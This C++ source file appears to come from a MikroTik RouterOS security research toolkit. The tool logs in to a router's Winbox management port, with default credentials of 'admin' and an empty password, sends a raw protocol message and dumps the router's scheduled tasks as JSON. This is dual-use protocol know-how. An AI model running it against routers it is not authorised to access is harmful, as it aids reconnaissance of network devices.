    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"
#include "md5.hpp"

namespace
{
    const char s_version[] = "By the Way 1.1.0";

    /*!
     * Parses the command line arguments. The program will always use two
     * parameters (ip and winbox port) but the port will default to 8291 if
     * not present on the CLI
     *
     * \param[in] p_arg_count the number of arguments on the command line
     * \param[in] p_arg_array the arguments passed on the command line
     * \param[in,out] p_ip the ip address to connect to
     * \param[in,out] p_winbox_port the winbox port to connect to
     * \return true if we have valid ip and ports. false otherwise.
     */
    bool parseCommandLine(int p_arg_count, const char* p_arg_array[],
                          std::string& p_ip, std::string& p_winbox_port, std::string& p_login, std::string& p_password)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("winbox-port,w", boost::program_options::value<std::string>()->default_value("8291"), "The winbox port")
        ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to")
        ("login,l", boost::program_options::value<std::string>()->default_value("admin"), "The username")
        ("password,p", boost::program_options::value<std::string>()->default_value(""), "The password");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_arg_count, p_arg_array, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("winbox-port") && argv_map.count("login") && argv_map.count("password"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_winbox_port.assign(argv_map["winbox-port"].as<std::string>());
            p_login.assign(argv_map["login"].as<std::string>());
            p_password.assign(argv_map["password"].as<std::string>());
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }
}

bool print_schedulers(const std::string& p_ip, const std::string& p_port,
                      const std::string& p_username, const std::string& p_password) {
    Winbox_Session mproxy_session(p_ip, p_port);
    if (!mproxy_session.connect())
    {
        std::cerr << "[-] Failed to connect to the remote host" << std::endl;
        return false;
    }

    boost::uint32_t p_session_id = 0;
    if (!mproxy_session.login(p_username, p_password, p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    WinboxMessage msg;
    msg.set_to(48, 3);
    msg.set_command(16646148);
//    msg.set_command(16646157);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    mproxy_session.send(msg);
    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }

    std::cout << msg.serialize_to_json() << std::endl;
    if(msg.serialize_to_json() == "{}") {
        return false;
    }
    return true;
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string winbox_port;
    std::string admin_username = "read";
    std::string admin_password = "";
    if (!parseCommandLine(p_argc, p_argv, ip, winbox_port, admin_username, admin_password))
    {
        return EXIT_FAILURE;
    }

    print_schedulers(ip, winbox_port, admin_username, admin_password);
}

